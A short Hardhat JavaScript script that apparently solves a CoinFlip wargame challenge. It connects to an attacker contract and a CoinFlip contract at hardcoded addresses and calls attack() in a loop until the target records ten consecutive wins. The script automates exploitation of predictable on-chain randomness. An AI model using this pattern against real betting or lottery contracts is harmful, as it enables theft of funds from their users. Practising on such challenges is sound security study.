const { ethers } = require("hardhat")
const path = require("path");
const fs = require("fs");

let ATTACKER_CONTRACT = null
let RANDOMNUM_CONTRACT = null
let SIGNER=null
const delay = ms => new Promise(res => setTimeout(res, ms));

const contractsDir = path.join(__dirname, "..", "frontend", "src", "contracts");

async function attack() {
    let wins = await RANDOMNUM_CONTRACT.connect(SIGNER).consecutiveWins();
    
    while(wins < 10) {
        console.log(`win progress: ${wins}/10`)

        await delay(10*1000)
        try{
            const attactTx = await ATTACKER_CONTRACT.connect(SIGNER).attack();
            await attactTx.wait();
        } catch (e) {
            continue;
        }
        
        
        wins = await RANDOMNUM_CONTRACT.consecutiveWins();
    }

    console.log("Done!");
}

async function init(attacker_addr, randomnum_addr) {
    const attacker_abi_file = path.join(contractsDir, 'CoinFlipAttacker.json')
    const attacker_abi = fs.readFileSync(attacker_abi_file).toString();


    const randomnum_abi_file = path.join(contractsDir, 'CoinFlip.json')
    const randomnum_abi = fs.readFileSync(randomnum_abi_file).toString();

    //const provider = new ethers.providers.JsonRpcProvider("https://rpc.sepolia.dev");

    SIGNER = await ethers.getSigner();

    ATTACKER_CONTRACT = new ethers.Contract(attacker_addr, JSON.parse(attacker_abi).abi, SIGNER); 
    RANDOMNUM_CONTRACT = new ethers.Contract(randomnum_addr, JSON.parse(randomnum_abi), SIGNER);
}

(async () =>{
    await init(
        '0x05B38954EBBD90ab168fA2C85f6a324c802ad3D3',
        '0x4465Fde5c9CcC8fE163Ed4719831831E97F9b67f'
    );
    await attack();
})();